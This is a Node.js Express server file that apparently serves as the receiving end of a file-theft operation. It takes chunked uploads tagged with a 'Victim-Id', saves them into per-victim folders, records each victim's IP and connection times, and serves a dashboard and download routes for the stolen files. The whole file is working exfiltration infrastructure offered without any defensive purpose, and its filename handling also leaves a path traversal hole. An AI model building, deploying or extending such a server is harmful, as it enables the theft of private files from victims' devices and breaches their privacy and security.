const fs = require('fs');
require('dotenv').config();
const cors = require('cors');
const express = require('express');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 8080; // Railway assigns a port dynamically

// Enable CORS with specific options
const corsOptions = {
  origin: ['https://deobfrontend-f30nw0x1c-2naseernoors-projects.vercel.app', 'https://deobfrontend-git-main-2naseernoors-projects.vercel.app'],
  methods: ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Victim-Id', 'Filename', 'Chunk-Index', 'Total-Chunks'],
  credentials: true,
};
app.use(cors(corsOptions));

// Serve the dashboard as static files
app.use('/dashboard', express.static(path.join(__dirname, 'dashboard')));

app.get('/dashboard/', (req, res) => {
  res.sendFile(path.join(__dirname, 'dashboard', 'index.html'));
});

// Middleware to handle raw binary data for file uploads
app.use(express.raw({ type: 'application/octet-stream', limit: '100mb' }));

// Base directory for storing files
const OUTPUT_BASE_DIR = path.join(__dirname, 'received_files');
if (!fs.existsSync(OUTPUT_BASE_DIR)) {
  fs.mkdirSync(OUTPUT_BASE_DIR, { recursive: true });
}

const victimFolders = {};
const victimFileCounts = {};
const victimTotalFiles = {};
const victimFiles = {};
const connectedDevices = {};

// Track received chunks
const chunkTracker = new Map();

// Route to handle file uploads
app.post('/upload', (req, res) => {
  try {
    const filename = decodeURIComponent(req.headers['filename']);
    const victimId = decodeURIComponent(req.headers['victim-id']);
    const chunkIndex = parseInt(req.headers['chunk-index']);
    const totalChunks = parseInt(req.headers['total-chunks']);
    const ip = req.ip;

    if (!filename || !victimId || isNaN(chunkIndex) || isNaN(totalChunks)) {
      return res.status(400).json({ error: 'Missing or invalid headers' });
    }

    const chunkId = `${victimId}-${filename}-${chunkIndex}`;

    // Initialize chunk tracking for each file
    if (!chunkTracker.has(chunkId)) {
      chunkTracker.set(chunkId, new Set());
    }

    if (chunkTracker.get(chunkId).has(chunkIndex)) {
      console.log(`⏭️ Skipping duplicate chunk: ${chunkId}`);
      return res.status(200).json({ message: 'Duplicate chunk skipped' });
    }

    chunkTracker.get(chunkId).add(chunkIndex);

    if (!connectedDevices[victimId]) {
      connectedDevices[victimId] = {
        ip: ip,
        connectionTime: Date.now(),
        lastConnectionTime: new Date(),
        filesTransferred: 0,
        totalUploadTime: 0,
        fileList: [],
        fileDurations: {},  // Track individual file transfer durations
        fileStartTimes: {},  // Track individual file start times
        fileEndTimes: {},    // Track individual file end times
      };
    } else {
      connectedDevices[victimId].lastConnectionTime = new Date();
    }

    if (!victimFolders[victimId]) {
      const timestamp = new Date().toISOString().replace(/:/g, '-');
      victimFolders[victimId] = path.join(OUTPUT_BASE_DIR, `${victimId}_${timestamp}`);
      fs.mkdirSync(victimFolders[victimId], { recursive: true });
      victimFileCounts[victimId] = 0;
      victimTotalFiles[victimId] = totalChunks;
    }

    const victimFolder = victimFolders[victimId];
    const filePath = path.join(victimFolder, filename);

    // Track the start time for the file upload using process.hrtime for high-resolution time tracking
    const startTime = process.hrtime();
    if (!connectedDevices[victimId].fileStartTimes[filename]) {
      connectedDevices[victimId].fileStartTimes[filename] = startTime;
    }

    fs.appendFile(filePath, req.body, (err) => {
      if (err) {
        console.error(`❌ Error writing file:`, err);
        return res.status(500).json({ error: 'Error saving file' });
      }

      console.log(`✅ Chunk ${chunkIndex + 1} of ${totalChunks} received for file: ${filename}`);
      victimFileCounts[victimId] += 1;
      connectedDevices[victimId].filesTransferred += 1;

      // Add the file to the list only if it's not already there
      if (!connectedDevices[victimId].fileList.includes(filename)) {
        connectedDevices[victimId].fileList.push(filename);
      }

      if (victimFileCounts[victimId] === totalChunks) {
        console.log(`✅ File upload complete: ${filename}`);

        // Calculate total upload time once all chunks are received
        const endTime = process.hrtime(startTime);
        connectedDevices[victimId].fileEndTimes[filename] = endTime; // Record end time for this file
        const uploadDuration = endTime[0] + endTime[1] / 1e9; // Convert to seconds (seconds + nanoseconds)

        connectedDevices[victimId].totalUploadTime += uploadDuration;

        // Track the transfer time for this file
        connectedDevices[victimId].fileDurations[filename] = uploadDuration;
      }

      res.status(200).json({ message: 'Chunk received successfully' });
    });
  } catch (error) {
    console.error(`❌ Error handling upload:`, error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Route to provide dashboard data
app.get('/dashboard-data', (req, res) => {
  const devicesData = Object.entries(connectedDevices).map(([victimId, device]) => {
    const fileDetails = device.fileList.map(file => {
      const transferTime = device.fileDurations[file] || 'N/A';
      return {
        fileName: file,
        transferTime: transferTime,
        endTime: device.fileEndTimes[file] ? `${device.fileEndTimes[file][0]}s ${device.fileEndTimes[file][1] / 1e6}ms` : 'N/A'
      };
    });

    return {
      victimId,
      ip: device.ip,
      connectionTime: new Date(device.connectionTime).toLocaleString(),
      lastConnectionTime: new Date(device.lastConnectionTime).toLocaleString(),
      totalUploadTime: device.totalUploadTime ? `${device.totalUploadTime} seconds` : 'N/A',
      fileList: fileDetails,
      totalFiles: device.fileList.length,
    };
  });

  res.json(devicesData);
});

// Route to download files
app.get('/download/:victimId/:filename', (req, res) => {
  try {
    const { victimId, filename } = req.params;

    if (!victimFolders[victimId]) {
      return res.status(404).json({ error: 'Victim folder not found' });
    }

    const victimFolder = victimFolders[victimId];
    const filePath = path.join(victimFolder, filename);

    if (!fs.existsSync(filePath)) {
      console.log(`❌ File not found at ${filePath}`);
      return res.status(404).json({ error: 'File not found' });
    }

    console.log(`📂 Downloading file from: ${filePath}`);
    
    res.download(filePath, filename, (err) => {
      if (err) {
        console.error(`❌ Error sending file:`, err);
        return res.status(500).json({ error: 'Error sending file' });
      }
    });

  } catch (error) {
    console.error(`❌ Error in download route:`, error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Start the server
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
});
